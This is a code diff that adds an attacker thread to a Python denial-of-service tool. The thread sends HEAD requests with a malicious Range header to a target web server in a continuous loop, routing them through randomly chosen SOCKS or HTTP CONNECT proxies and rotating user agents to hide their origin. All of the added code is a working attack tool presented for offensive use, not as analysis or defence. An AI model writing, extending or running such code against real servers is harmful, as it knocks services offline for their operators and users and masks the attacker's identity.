@@ -43,6 +43,67 @@ def get_target_info(url):
         raise ValueError("Could not parse hostname from URL")
     return host, port, socket.gethostbyname(host)
 
+def attacker_thread():
+    """
+    The main function for each attacker thread.
+    It continuously sends malicious requests through different proxies.
+    """
+    # Generate the malicious headers once per thread
+    range_header = generate_range_header()
+
+    while ATTACK_RUNNING:
+        proxy = random.choice(PROXIES)
+        proxy_ip, proxy_port, proxy_type = proxy['ip'], proxy['port'], proxy['type'].lower()
+        
+        s = None
+        try:
+            # Set up the socket based on the proxy type
+            if 'socks5' in proxy_type:
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+            elif 'socks4' in proxy_type:
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS4, proxy_ip, proxy_port)
+            elif 'connect' in proxy_type or 'tunnel' in proxy_type:
+                # HTTP CONNECT proxy requires a manual handshake
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((proxy_ip, proxy_port))
+                connect_req = f"CONNECT {TARGET_IP}:{TARGET_PORT} HTTP/1.0\r\n\r\n".encode('utf-8')
+                s.sendall(connect_req)
+                response = s.recv(1024)
+                if not b"200 OK" in response:
+                    # Failed to tunnel, skip this proxy for now
+                    s.close()
+                    continue
+            else: # No proxy or unknown type
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            # Connect to the final target
+            s.settimeout(5)
+            s.connect((TARGET_IP, TARGET_PORT))
+            
+            # Construct and send the malicious payload
+            user_agent = random.choice(USER_AGENTS)
+            payload = (
+                f"HEAD / HTTP/1.1\r\n"
+                f"Host: {TARGET_HOST}\r\n"
+                f"User-Agent: {user_agent}\r\n"
+                f"Range: bytes={range_header}\r\n"
+                f"Connection: close\r\n\r\n"
+            ).encode('utf-8')
+
+            s.sendall(payload)
+            
+        except (socket.error, socks.ProxyError, socket.timeout) as e:
+            # If any connection error occurs, we just ignore it and move on
+            # In a real attack, the proxy might be marked as 'bad' and retried later
+            pass
+        finally:
+            if s:
+                s.close()
+        
+        # A small delay to prevent overwhelming the local CPU/network instantly
+        time.sleep(0.05)
 
 
 # --- Main Execution ---
